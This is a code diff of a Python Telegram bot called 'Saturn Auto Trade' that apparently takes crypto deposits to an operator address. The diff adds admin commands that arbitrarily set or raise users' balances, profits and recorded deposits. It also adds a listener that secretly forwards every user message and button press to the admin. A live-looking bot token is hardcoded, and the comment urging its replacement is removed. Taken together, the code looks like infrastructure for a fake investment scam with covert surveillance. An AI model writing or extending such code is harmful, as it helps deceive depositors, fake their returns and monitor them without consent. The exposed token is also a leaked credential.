@@ -12,9 +12,8 @@ import random
 ADMIN_ID = 6320779357           # your Telegram user ID
 ADMIN_MIRROR_ENABLED = False    # start with mirror OFF
 
-
 # ===== CONFIG =====
-BOT_TOKEN = "8359973623:AAH8rUS6EjiSoPQKdDiJ_FxuoC5dE5ddrvs"  # REPLACE with a fresh token for production
+BOT_TOKEN = "8359973623:AAH8rUS6EjiSoPQKdDiJ_FxuoC5dE5ddrvs"  # your bot token
 DB_FILE = "saturn_db.json"
 
 # This is the public "deposit" address shown in /start and /deposit
@@ -191,11 +190,14 @@ def cmd_help(message):
         "🛰 Saturn Auto Trade Help\n\nUse the menu buttons to navigate."
     )
 
-# ===== ADMIN COMMANDS & MIRRORING =====
+# ===== ADMIN COMMANDS =====
+
+def _admin_only(message):
+    return message.from_user.id == ADMIN_ID
 
 @bot.message_handler(commands=["admin_on"])
 def admin_on(message):
-    if message.from_user.id != ADMIN_ID:
+    if not _admin_only(message):
         return
     global ADMIN_MIRROR_ENABLED
     ADMIN_MIRROR_ENABLED = True
@@ -206,7 +208,7 @@ def admin_on(message):
 
 @bot.message_handler(commands=["admin_off"])
 def admin_off(message):
-    if message.from_user.id != ADMIN_ID:
+    if not _admin_only(message):
         return
     global ADMIN_MIRROR_ENABLED
     ADMIN_MIRROR_ENABLED = False
@@ -217,7 +219,7 @@ def admin_off(message):
 
 @bot.message_handler(commands=["reply"])
 def admin_reply(message):
-    if message.from_user.id != ADMIN_ID:
+    if not _admin_only(message):
         return
     parts = message.text.split(" ", 2)
     if len(parts) < 3:
@@ -235,27 +237,215 @@ def admin_reply(message):
     except Exception as e:
         bot.reply_to(message, f"❌ Error sending: {e}")
 
-# Mirror ALL messages (text & commands) from users
-@bot.message_handler(func=lambda m: True)
-def mirror_all_messages(message):
-    global ADMIN_MIRROR_ENABLED
+def _get_target_user(user_id_str):
+    try:
+        uid = int(user_id_str)
+    except ValueError:
+        return None, "User ID must be a number."
+    user = get_user(uid)
+    return user, None
 
-    # Don't mirror your own admin messages
-    if message.from_user.id == ADMIN_ID:
+def _parse_amount(amount_str):
+    try:
+        return float(amount_str), None
+    except ValueError:
+        return None, "Amount must be a number."
+
+@bot.message_handler(commands=["add_balance"])
+def admin_add_balance(message):
+    if not _admin_only(message):
         return
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, "Usage: /add_balance <user_id> <amount>")
+        return
+    user, err = _get_target_user(parts[1])
+    if err:
+        bot.reply_to(message, err)
+        return
+    amount, err = _parse_amount(parts[2])
+    if err:
+        bot.reply_to(message, err)
+        return
+    user["balance"] += amount
+    save_db()
+    bot.reply_to(message, f"✅ Added {amount} to balance. New balance: {user['balance']}")
 
-    if ADMIN_MIRROR_ENABLED:
-        username = f"@{message.from_user.username}" if message.from_user.username else "None"
-        text = message.text if message.text is not None else "<non-text message>"
-        bot.send_message(
-            ADMIN_ID,
-            f"🟦 USER MESSAGE\n"
-            f"👤 From: {message.from_user.id} ({username})\n"
-            f"💬 Text: {text}"
-        )
+@bot.message_handler(commands=["set_balance"])
+def admin_set_balance(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, "Usage: /set_balance <user_id> <amount>")
+        return
+    user, err = _get_target_user(parts[1])
+    if err:
+        bot.reply_to(message, err)
+        return
+    amount, err = _parse_amount(parts[2])
+    if err:
+        bot.reply_to(message, err)
+        return
+    user["balance"] = amount
+    save_db()
+    bot.reply_to(message, f"✅ Set balance to {amount}")
 
-    # Note: your other command handlers (start/help) still run separately
+@bot.message_handler(commands=["add_profit"])
+def admin_add_profit(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, "Usage: /add_profit <user_id> <amount>")
+        return
+    user, err = _get_target_user(parts[1])
+    if err:
+        bot.reply_to(message, err)
+        return
+    amount, err = _parse_amount(parts[2])
+    if err:
+        bot.reply_to(message, err)
+        return
+    user["profit_total"] += amount
+    save_db()
+    bot.reply_to(message, f"✅ Added {amount} to profit. New profit: {user['profit_total']}")
 
+@bot.message_handler(commands=["set_profit"])
+def admin_set_profit(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, "Usage: /set_profit <user_id> <amount>")
+        return
+    user, err = _get_target_user(parts[1])
+    if err:
+        bot.reply_to(message, err)
+        return
+    amount, err = _parse_amount(parts[2])
+    if err:
+        bot.reply_to(message, err)
+        return
+    user["profit_total"] = amount
+    save_db()
+    bot.reply_to(message, f"✅ Set profit_total to {amount}")
+
+@bot.message_handler(commands=["set_deposit"])
+def admin_set_deposit(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, "Usage: /set_deposit <user_id> <amount>")
+        return
+    user, err = _get_target_user(parts[1])
+    if err:
+        bot.reply_to(message, err)
+        return
+    amount, err = _parse_amount(parts[2])
+    if err:
+        bot.reply_to(message, err)
+        return
+    user["total_deposited"] = amount
+    save_db()
+    bot.reply_to(message, f"✅ Set total_deposited to {amount}")
+
+@bot.message_handler(commands=["view_user"])
+def admin_view_user(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "Usage: /view_user <user_id>")
+        return
+    user, err = _get_target_user(parts[1])
+    if err:
+        bot.reply_to(message, err)
+        return
+    text = (
+        f"👤 User Data for {parts[1]}\n"
+        f"Created: {user['created_at']}\n"
+        f"Last Address Edit: {user['last_address_edit']}\n"
+        f"Withdraw Address: {user['withdraw_address'] or 'None'}\n"
+        f"Address Locked: {user['address_locked']}\n"
+        f"Balance: {user['balance']}\n"
+        f"Total Deposited: {user['total_deposited']}\n"
+        f"Profit Total: {user['profit_total']}\n"
+        f"Sniper Running: {user['sniper_running']}\n"
+        f"Main Msg ID: {user['main_message_id']}\n"
+        f"Info Msg ID: {user['info_message_id']}"
+    )
+    bot.reply_to(message, text)
+
+@bot.message_handler(commands=["reset_user"])
+def admin_reset_user(message):
+    if not _admin_only(message):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "Usage: /reset_user <user_id>")
+        return
+    uid_str = parts[1]
+    try:
+        uid = int(uid_str)
+    except ValueError:
+        bot.reply_to(message, "User ID must be a number.")
+        return
+    user = get_user(uid)
+    created_at = user["created_at"]
+    db[str(uid)] = {
+        "created_at": created_at,
+        "last_address_edit": "N/A",
+        "withdraw_address": "",
+        "address_locked": False,
+        "balance": 0.0,
+        "total_deposited": 0.0,
+        "profit_total": 0.0,
+        "sniper_running": False,
+        "main_message_id": None,
+        "info_message_id": None,
+        "temp_prompt_msg_id": None
+    }
+    save_db()
+    bot.reply_to(message, f"✅ Reset user {uid_str} data.")
+
+@bot.message_handler(commands=["list_users"])
+def admin_list_users(message):
+    if not _admin_only(message):
+        return
+    if not db:
+        bot.reply_to(message, "No users found.")
+        return
+    ids = ", ".join(db.keys())
+    bot.reply_to(message, f"👥 Users in DB:\n{ids}")
+
+# ===== ADMIN MIRROR LISTENER FOR MESSAGES =====
+
+def listener(messages):
+    if not ADMIN_MIRROR_ENABLED:
+        return
+    for m in messages:
+        try:
+            if m.from_user is None:
+                continue
+            if m.from_user.id == ADMIN_ID:
+                continue
+            username = f"@{m.from_user.username}" if m.from_user.username else "None"
+            if getattr(m, "text", None):
+                content = f"💬 Text: {m.text}"
+            else:
+                content = f"📎 Message type: {m.content_type}"
+            bot.send_message(
+                ADMIN_ID,
+                f"🟦 USER MESSAGE\n"
+                f"👤 From: {m.from_user.id} ({username})\n"
+                f"{content}"
+            )
+        except Exception:
+            pass
+
+bot.set_update_listener(listener)
 
 # ===== CALLBACKS =====
 
@@ -267,12 +457,15 @@ def callback(call):
     # --- ADMIN MIRROR FOR BUTTON PRESSES ---
     if ADMIN_MIRROR_ENABLED and call.from_user.id != ADMIN_ID:
         username = f"@{call.from_user.username}" if call.from_user.username else "None"
-        bot.send_message(
-            ADMIN_ID,
-            f"🟩 BUTTON PRESSED\n"
-            f"👤 From: {call.from_user.id} ({username})\n"
-            f"🆔 Callback: {call.data}"
-        )
+        try:
+            bot.send_message(
+                ADMIN_ID,
+                f"🟩 BUTTON PRESSED\n"
+                f"👤 From: {call.from_user.id} ({username})\n"
+                f"🆔 Callback: {call.data}"
+            )
+        except Exception:
+            pass
 
     # --- WITHDRAW MENU ---
     if call.data == "withdraw":
